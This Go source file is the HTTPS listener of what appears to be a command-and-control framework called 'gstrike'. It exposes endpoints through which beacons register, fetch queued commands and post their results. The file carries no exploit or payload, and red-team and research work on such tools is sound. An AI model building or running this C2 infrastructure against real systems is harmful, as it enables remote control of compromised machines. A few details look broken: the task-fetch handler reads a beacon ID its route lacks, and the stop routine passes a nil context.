package transport

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"gstrike/pkg/config"
	"gstrike/pkg/core/beaconmgr"
	"gstrike/pkg/core/taskmgr"
	"gstrike/pkg/util"
	"net/http"
	"strconv"
	"time"

	"github.com/gorilla/mux"
)

var Listeners []HttpsListener

type status int

const (
	stopped status = iota
	running
)

type HttpsListener struct {
	ID        string    // Unique identifier (e.g., UUID)
	Port      int 
	CreatedAt time.Time 
	StartedAt time.Time
	Status    status 
	CertFile  string 
	KeyFile   string 
	Server    *http.Server
}

func NewHttps(port int) (*HttpsListener, error) {
	id, err := util.RandomString(10)
	if err != nil {
		return nil, err
	}

	listener := HttpsListener{
		ID:        id,
		Port:      port,
		CreatedAt: time.Now(), 
		CertFile:  config.CertPath,
		KeyFile:   config.KeyPath,
	}
	listener.Status = stopped
	Listeners = append(Listeners, listener)
	return &Listeners[len(Listeners)-1], nil 
}

func (l *HttpsListener) Start() error {
	r := mux.NewRouter()
	beaconApi := r.PathPrefix("/").Subrouter()

	beaconApi.HandleFunc("/register", RegisterBeacon).Methods("POST")
	beaconApi.HandleFunc("/tasks", GetTask).Methods("GET")
	beaconApi.HandleFunc("/tasks/{beaconId}", PostTask).Methods("POST")
	beaconApi.HandleFunc("/results/{beaconId}", PostResults).Methods("POST")

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}
	l.Server = &http.Server{
		Addr:      ":" + strconv.Itoa(l.Port),
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	l.StartedAt = time.Now()
	l.Status = running
	err := l.Server.ListenAndServeTLS(l.CertFile, l.KeyFile)
	if err != nil {
		return err
	}
	return err
}

func (l *HttpsListener) Stop() error {
	var ctx context.Context
	var err error
	if l.Status == running {
		l.Status = stopped
		err = l.Server.Shutdown(ctx)
	}
	return err
}

func RegisterBeacon(w http.ResponseWriter, r *http.Request) {
	beacon, err := beaconmgr.NewBeacon(w, r)
	if err != nil {
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(beacon)
}

func PostResults(w http.ResponseWriter, r *http.Request) {
	var TaskRes taskmgr.Task
	if err := json.NewDecoder(r.Body).Decode(&TaskRes); err != nil {
		return
	}
	taskmgr.UpdateTask(TaskRes)
}

func GetTask(w http.ResponseWriter, r *http.Request) {
	beaconId := mux.Vars(r)["beaconId"]
	next := taskmgr.NextTasks(beaconId)

	w.Header().Set("Content-Type", "application/json")
	err := json.NewEncoder(w).Encode(next)
	if err != nil {
		return
	}
}

func PostTask(w http.ResponseWriter, r *http.Request) {
	beaconId := mux.Vars(r)["beaconId"]
	var TaskReq taskmgr.Task
	if err := json.NewDecoder(r.Body).Decode(&TaskReq); err != nil {
		return
	}
	err := taskmgr.NewTask(TaskReq.Command, beaconId)
	if err != nil {
		return
	}
}
